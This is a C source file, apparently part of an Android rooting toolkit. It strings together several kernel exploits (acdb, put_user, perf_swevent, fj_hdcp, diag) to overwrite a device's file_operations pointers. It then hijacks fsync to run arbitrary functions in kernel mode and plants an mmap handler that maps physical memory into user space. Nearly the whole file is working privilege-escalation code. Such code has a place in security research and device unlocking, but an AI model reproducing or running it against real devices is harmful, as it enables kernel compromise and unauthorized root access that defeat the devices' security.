#define _LARGEFILE64_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>

#include "libperf_event_exploit/perf_swevent.h"
#include "libmsm_acdb_exploit/acdb.h"
#include "libput_user_exploit/put_user.h"
#include "libdiagexploit/diag.h"
#include "libfj_hdcp_exploit/fj_hdcp.h"
#include "mm.h"
#include "kernel_memory.h"
#include "fops_handler.h"

#define PAGE_SHIFT              12

static bool (*kernel_mode_function)(void *);
static void *kernel_mode_function_user_data;
static bool kernel_mode_function_result;

static void call_function_in_kernel_mode(void)
{
  kernel_mode_function_result = kernel_mode_function(kernel_mode_function_user_data);
}

static bool
run_function_by_fsync(void *target_device_path)
{
  int fd;

  fd = open(target_device_path, O_WRONLY);
  fsync(fd);
  close(fd);

  return true;
}

static bool
attempt_acdb_exploit(unsigned long int address, unsigned long int value, unsigned long int original_value, bool (*function)(void *), void *user_data)
{
  if (acdb_run_exploit(address, value, function, user_data)) {
    acdb_write_value_at_address(address, original_value);

    return true;
  }

  return false;
}

static bool
attempt_fj_hdcp_exploit(unsigned long int address, unsigned long int value, unsigned long int original_value, bool (*function)(void *), void *user_data)
{
  if (fj_hdcp_run_exploit(address, value, function, user_data)) {
    fj_hdcp_write_value_at_address(address, original_value);

    return true;
  }

  return false;
}

static bool
attempt_put_user_exploit(unsigned long int address, unsigned long int value, unsigned long int original_value, bool (*function)(void *), void *user_data)
{
  if (put_user_run_exploit(address, value, function, user_data)) {
    put_user_write_value_at_address(address, original_value);

    return true;
  }

  return false;
}

static bool
attempt_diag_exploit(unsigned long int address, unsigned long int value, bool (*function)(void *), void *user_data)
{
  struct diag_values injection_data;

  injection_data.address = address;
  injection_data.value = (uint16_t)value;

  return diag_run_exploit(&injection_data, 1, function, user_data);
}

static bool
run_function_by_exploit(unsigned long int *address, unsigned long int value, unsigned long int restore_value, bool (*function)(void *), void *user_data)
{
  printf("Attempt acdb exploit...\n");
  if (attempt_acdb_exploit((unsigned long int)address, value, restore_value, function, user_data)) {
    return true;
  }

  printf("Attempt put_user exploit...\n");
  if (attempt_put_user_exploit((unsigned long int)address, value, restore_value, function, user_data)) {
    return true;
  }

  printf("Attempt perf_swevent exploit...\n");
  if (perf_swevent_run_exploit((unsigned long int)address, value, function, user_data)) {
    return true;
  }

  printf("Attempt fj_hdcp exploit...\n");
  if (attempt_fj_hdcp_exploit((unsigned long int)address, value, restore_value, function, user_data)) {
    return true;
  }

  printf("Attempt diag exploit...\n");
  if (attempt_diag_exploit((unsigned long int)address, value, function, user_data)) {
    return true;
  }

  return false;
}

static bool
run_function_by_kernel_memory(unsigned long int *address, unsigned long int value, unsigned long int restore_value, bool (*function)(void *), void *user_data)
{
  unsigned long int *mapped_address;

  mapped_address = convert_to_kernel_mapped_address(address);

  *mapped_address = value;
  function(user_data);
  *mapped_address = restore_value;

  return true;
}

bool
fops_run_in_kernel_mode(void *fops_address, const char *device_path, fops_run_mode mode, bool (*function)(void *), void *user_data)
{
  void *fops_fsync_address;

  fops_fsync_address = fops_address + 0x38;

  kernel_mode_function = function;
  kernel_mode_function_user_data = user_data;
  kernel_mode_function_result = false;

  switch (mode) {
  case FOPS_RUN_BY_EXPLOIT:
    run_function_by_exploit(fops_fsync_address, (unsigned long int)&call_function_in_kernel_mode, 0, run_function_by_fsync, (void *)device_path);
    break;

  case FOPS_RUN_BY_KERNEL_MEMORY:
    run_function_by_kernel_memory(fops_fsync_address, (unsigned long int)&call_function_in_kernel_mode, 0, run_function_by_fsync, (void *)device_path);
    break;
  }

  return kernel_mode_function_result;
}

static int (*remap_pfn_range)(struct vm_area_struct *, unsigned long addr,
                              unsigned long pfn, unsigned long size, pgprot_t);

struct mmap_handler_param_t {
  void **fops_mmap_address;
  unsigned long int physical_address;
};

static struct mmap_handler_param_t mmap_handler_param;

static int
mmap_handler(struct file *filp, struct vm_area_struct *vma)
{
  unsigned long offset;

  *mmap_handler_param.fops_mmap_address = NULL;

  offset = mmap_handler_param.physical_address >> PAGE_SHIFT;

  return remap_pfn_range(vma, vma->vm_start, offset,
                         vma->vm_end - vma->vm_start, vma->vm_page_prot);
}

static bool
install_mmap_handler(void *user_data)
{
  mmap_handler_param = *(struct mmap_handler_param_t *)user_data;

  if (*mmap_handler_param.fops_mmap_address) {
    return false;
  }

  if (!remap_pfn_range) {
    return false;
  }

  *mmap_handler_param.fops_mmap_address = &mmap_handler;
  return true;
}

bool
fops_map_physical_memory(void *fops_address,
                         const char *device_path,
                         fops_run_mode mode,
                         unsigned long int map_address,
                         unsigned long int physical_address,
                         unsigned long int size)
{
  struct mmap_handler_param_t param;
  void *address;
  int fd;

  param.physical_address = physical_address;
  param.fops_mmap_address = fops_address + 0x28;

  remap_pfn_range = get_remap_pfn_range_address();
  if (!remap_pfn_range) {
    return false;
  }

  fd = open(device_path, O_RDWR);
  if (fd < 0) {
    return false;
  }

  if (!fops_run_in_kernel_mode(fops_address, device_path, mode, install_mmap_handler, &param)) {
    goto error_exit;
  }

  address = mmap((void *)map_address, size, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, fd, 0);
  if (address == MAP_FAILED) {
    printf("%s\n", strerror(errno));
    printf("mmap handler for %s is broken.\n", device_path);
    goto error_exit;
  }

  close(fd);
  return true;

error_exit:
  close(fd);
  return false;
}

bool fops_unmap_physical_memory(unsigned long int map_address, unsigned long int size)
{
  return munmap((void *)map_address, size) == 0;
}
